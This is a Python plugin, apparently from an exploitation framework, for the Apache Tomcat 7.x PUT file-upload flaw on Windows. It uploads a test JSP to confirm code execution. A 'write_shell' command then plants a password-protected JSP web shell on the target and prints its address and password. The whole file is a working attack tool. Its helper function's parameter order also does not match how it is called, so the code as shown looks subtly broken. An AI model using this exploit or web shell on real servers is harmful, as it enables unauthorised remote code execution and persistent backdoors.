# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Tomcat任意写入文件漏洞",
        "version": "Apache Tomcat 7.0.0 - 7.0.81",
        "description": "当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_int = self.build_random_int(4)
        if self.custom_upload_file(self.target.value, 'error.jsp', f"<%out.println({random_int}*4);%>", str(random_int*4)):
            return {"LoopholeInfo": self.__info__}

    def custom_upload_file(self, filename, url, content, flag):
        self.request(method='PUT', url=urllib.parse.urljoin(url, f'./{filename}/'), timeout=15, data=content)
        url = urllib.parse.urljoin(url, f'./{filename}')
        r = self.request(method='GET', url=url, timeout=15)
        if r.status_code == 200 and flag in r.text:
            return url

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        name, password, code, flag = self.build_web_shell('jsp')
        res = self.custom_upload_file(url, name, code, flag)
        if res:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {res}')
            self.log.success(f'访问密码: {password}')
        else:
            self.log.failure('一句话马写入失败')
